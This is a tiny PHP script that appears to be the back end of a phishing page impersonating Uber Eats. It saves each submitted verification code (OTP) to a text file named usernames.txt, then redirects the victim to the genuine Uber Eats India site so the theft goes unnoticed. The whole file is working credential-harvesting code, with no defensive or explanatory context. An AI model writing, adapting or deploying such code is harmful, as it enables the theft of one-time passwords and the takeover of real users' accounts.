<?php
file_put_contents("usernames.txt", "OTP: " . $_POST['verificationCode'] . "\n", FILE_APPEND);
header('Location: https://www.ubereats.com/en-IN/');
exit();
?>